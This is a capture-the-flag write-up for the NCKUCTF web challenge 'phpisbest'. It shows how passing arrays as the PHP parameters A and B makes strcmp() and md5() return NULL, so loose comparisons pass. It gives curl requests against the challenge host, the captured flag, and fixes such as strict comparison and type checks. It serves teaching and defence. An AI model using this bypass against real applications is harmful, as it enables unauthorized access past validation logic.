# Phpisbest



{{< admonition tldr "TL;DR" >}}

**phpisbest** is a web challenge from **NCKUCTF**. * **Challenge Name** : phpisbest * **Category** : WEB * **Organizer** : NCKUCTF * **Writeup Author** : spawn2pwn

{{< /admonition >}}

## **1. Identity Challenge**

* **Challenge Name** : phpisbest
* **Category** : WEB
* **Organizer** : NCKUCTF
* **Writeup Writer** : spawn2pwn

---

## **2. Problem Description**

This challenge displays PHP source code directly which contains several validation conditions for two input parameters, namely `A` and `B` . FLAG will only be displayed if all conditions are met.

The objective of this challenge is to find `A` and `B` values ​​that can pass all validation.

---

## **3. System Analysis**

Based on source code:

```php id="k2p9xn"
if (isset($A) && isset($B))
    if ($A != $B)
        if (strcmp($A, $B) == 0)
            if (md5($A) == md5($B))
                echo $flag;
```

There are three main conditions:

1. `$A != $B` → A and B must be different
2. `strcmp($A, $B) == 0` → A and B must be the same (string comparison)
3. `md5($A) == md5($B)` → A and B's hashes must be the same

According to normal logic, this condition is **contradictory**:

* `$A != $B` means different
* `strcmp($A, $B) == 0` means the same

---

## **4. Identify Vulnerabilities**

The vulnerabilities discovered are:

> **Type Confusion / Improper Input Handling in PHP**

Function:

* `strcmp()` expects input to be of type string
* `md5()` also expects strings

However, if given an **array**, then:

* The function will generate a *warning*
* Return value becomes **NULL**

In PHP:

```php
strcmp(array(), array()) == 0   // true (karena NULL == 0)
md5(array()) == md5(array())   // true (NULL == NULL)
```

Additionally:

```php
array() != array() // tergantung isi array (bisa true)
```

---

## **5. Exploitation Methodology**

### **5.1 Manipulating Input Into Arrays**

Parameters are sent in array form:

```id="g4v8zm"
A[]=0
B[]=1
```

---

### **5.2 Sending Request**

```bash id="p8k3wr"
curl -i "https://chall.nckuctf.org:28106/?A[]=0&B[]=1"
```

---

## **6. Exploitation Results**

The response shows that a warning appears due to an inappropriate data type, but the condition is still met and FLAG is displayed:

```id="v9q1tn"
NCKUCTF{php_15_7h3_8357_14n9u493}
```

---

## **7. Discussion**

The main problem in this challenge is:

* No input type validation
* Use of string functions ( `strcmp` , `md5` ) without ensuring data type
* Comparison using loose operators ( `==` )

As a result:

* Array input causes the function to fail and return NULL
* Comparison of NULL with another value results in an unexpected condition
* All validations can be skipped

This vulnerability relates to:

* **Juggling type**
* **Type confusion**
* **Improper input validation**

---

## **8. Improvement Recommendations**

To prevent this vulnerability:

1. **Data Type Validation**

```php
   if (!is_string($A) || !is_string($B)) die("Invalid input");
   ```

2. **Use Strict Comparison**

```php
   strcmp($A, $B) === 0
   ```

3. **Handle Errors Correctly**

   * Don't ignore warnings from the function

4. **Input Sanitation**

   * Make sure the input matches the expected format

---

## **9. Conclusion**

This challenge shows that:

> Errors in handling data types in PHP can cause bypass of validation logic

By utilizing input in the form of an array, an attacker can cause the built-in function to fail and return a value that allows all conditions to be met.

---

## **10. Attachments**

### **Source Code**

```php id="t7z2qn"
if ($A != $B)
    if (strcmp($A, $B) == 0)
        if (md5($A) == md5($B))
            echo $flag;
```

### **Exploit Request**

```bash id="y3k8lm"
curl -i "https://chall.nckuctf.org:28106/?A[]=0&B[]=1"
```

### **FLAG Extraction**

```bash id="n6v2xp"
curl -s "https://chall.nckuctf.org:28106/?A[]=0&B[]=1" | grep -o "NCKUCTF{.*}"
```


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/phpisbest/  

